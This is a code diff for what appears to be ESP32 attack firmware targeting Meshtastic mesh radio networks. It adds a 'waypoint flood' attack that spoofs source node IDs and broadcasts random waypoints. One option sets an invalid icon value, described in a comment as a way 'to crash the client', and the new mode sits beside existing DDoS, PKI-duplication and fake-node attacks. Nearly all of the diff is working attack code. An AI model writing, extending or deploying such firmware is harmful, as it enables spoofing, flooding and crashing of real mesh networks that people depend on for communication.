@@ -187,6 +187,28 @@ void TMAttack::atkRndNode() {
     sendDebugMessage("Sent fake node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
 }
 
+void TMAttack::atkWaypointFlood() {
+    uint32_t srcnode = target;
+    if (srcnode == 0xffffffff) {
+        srcnode = getRandomTarget();
+    }
+    if (srcnode == 0) {
+        srcnode = esp_random();
+    }
+    MC_Waypoint waypoint = {};
+    uint32_t icon = 0;
+    if (flood_clientcrash == 1) {
+        icon = esp_random() + 30;  // invalid icon to crash the client
+    }
+    uint32_t expire = 1769994122;  // 2026-02-02, todo add as a parameter
+    float latitude = min_lat + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lat - min_lat)));
+    float longitude = min_lon + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lon - min_lon)));
+    uint32_t wpnum = esp_random();
+    MeshtasticCompactHelpers::WaypointBuilder(waypoint, esp_random(), latitude, longitude, "WP-" + std::to_string(wpnum), "WP-" + std::to_string(wpnum), expire, icon);
+    meshtasticCompact->SendWaypointMessage(waypoint, 0xffffffff, 8, srcnode);
+    sendDebugMessage("Sent waypoint from node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
+}
+
 void TMAttack::loop() {
     if (meshtasticCompact == nullptr) {
         return;  // Radio not set
@@ -211,5 +233,7 @@ void TMAttack::loop() {
         atkDdos();
     } else if (current_attack == AttackType::PKI_DUPE) {
         atkPkiDupe();
+    } else if (current_attack == AttackType::WAYPOINT_FLOOD) {
+        atkWaypointFlood();
     }
 }
